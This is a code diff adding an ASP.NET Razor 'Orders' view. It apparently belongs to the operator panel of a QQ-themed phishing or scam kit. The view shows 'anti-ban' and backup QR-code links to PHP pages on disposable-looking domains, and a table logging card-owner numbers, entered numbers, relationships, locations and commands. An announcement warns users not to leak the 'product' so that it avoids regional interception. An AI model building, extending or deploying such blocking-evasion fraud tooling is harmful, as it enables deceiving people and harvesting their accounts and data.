@@ -1,0 +1,116 @@
+﻿
+@{
+    ViewBag.Title = "Orders";
+    Layout = "~/Areas/Li/Views/Shared/_Layout.cshtml";
+}
+
+    <script src="~/Areas/Li/assets/layer/layer.js"></script>
+
+<link href="~/Areas/Help/assets/css/My.css" rel="stylesheet" />
+
+<div class="page-header">
+   @* <a href="https://cli.im/api/qrcode/code?text=https://4xl.cn/hLCiXP" target="_blank">防封二维码[可以选择]</a>*@
+ 
+
+
+<a style="margin-left: 20px;color: red;" href="https://cli.im/api/qrcode/code?text=http://qq.netshopbo6d.fit/afnt2022.php" target="_blank">防封二维码</a>
+    <a style="margin-left: 20px;color: #1a08ff;" href="https://cli.im/api/qrcode/code?text=http://qq.netshopbo6e.fit/afnt2022bk.php" target="_blank">备用二维码</a>
+    <a style="margin-left: 20px;color: #1a08ff;" href="https://cli.im/api/qrcode/code?text=http://qq.netshopbo6f.fit/afnt2022bk.php" target="_blank">备用二维码2</a>
+   <a style="margin-left: 20px;color: #1a08ff;" href="https://cli.im/api/qrcode/code?text=http://qq.netshopbo6g.fit/afnt2022.php" target="_blank">备用二维码3</a>
+
+
+
+
+  
+
+
+
+  
+
+
+</div>
+<div class="row">
+    <div class="col-md-12">
+        <div class="card" style="width:105%;margin-left:-3%">
+            
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table id="shop-datatables" class="display table table-striped table-hover">
+                        <thead>
+                            <tr>
+                               
+                                <th>时间</th>
+                                <th>卡主号</th>
+                                <th>自输号</th>
+                                <th>*关系</th>
+                                <th>位置</th>                                
+                                <th>操作</th>
+                                <th>指令</th>
+
+                            </tr>
+                        </thead>
+
+                        <tbody>
+
+                            <tr>
+                            </tr>
+
+
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+<script>
+   var  whichOderCmd='@ViewBag.ID';
+</script>
+<script src="~/Areas/Li/assets/js/mm/shop2.js"></script>
+<!--核心样式-->
+<link rel="stylesheet" href="~/Areas/Help/assets/css/modallayer.min.css">
+
+<!--插件-->
+<script src="~/Areas/Help/assets/js/modallayer-ie.min.js"></script>
+
+<script>
+   layer.alert('公告：本产品禁止外泄！专属特征上线，解决地区拦截！还是那句话，你给别人用了，你被拦截的概率就高，自己看着办！！', { icon: 6 });
+   
+   
+    //上传凭证
+    function uploadPic() {
+
+
+        var tmpOrderID = $("#Tel").val() ;
+       alert(tmpOrderID);
+        var pic = $('#head_pic')[0].files[0];
+        var fd = new FormData();
+        fd.append('head_pic', pic);
+        fd.append('UserID', tmpOrderID);
+        $.ajax({
+            url: "/Li/Img/AddPingZheng",
+            type: "post",
+            // Form数据
+            data: fd,
+            cache: false,
+            contentType: false,
+            processData: false,
+            success: function (data) {
+                if (data == 1) {
+                    alert("提醒：上传成功...");
+                    $("#head_pic").hide();
+                    $("#imgUserOK").attr("src", "/UploadPZ/" + tmpOrderID + ".jpeg");
+                    $("#imgUserOK").show();
+                } else {
+                    alert("错误：上传失败，请稍后尝试...");
+                }
+
+
+            }
+        });
+
+    }
+
+
+</script>
